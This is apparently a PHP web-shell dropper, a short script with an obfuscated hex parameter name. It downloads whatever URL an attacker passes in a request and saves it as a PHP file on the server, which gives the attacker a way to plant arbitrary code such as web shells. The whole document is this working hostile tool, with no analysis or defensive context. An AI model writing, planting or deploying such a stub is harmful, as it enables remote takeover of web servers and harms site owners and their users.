<?php
$name = 'd538fe87f1462618a228.php';
$ch = curl_init ($_REQUEST['d538fe87f1462618a228']);
$fp = fopen ($name, "w+");
curl_setopt ($ch, CURLOPT_FILE, $fp);
$ult = curl_exec ($ch);
curl_close ($ch);
fclose ($fp);
if(!$ult){
$f = file_get_contents($_REQUEST['d538fe87f1462618a228']); 
file_put_contents($name,$f); 
}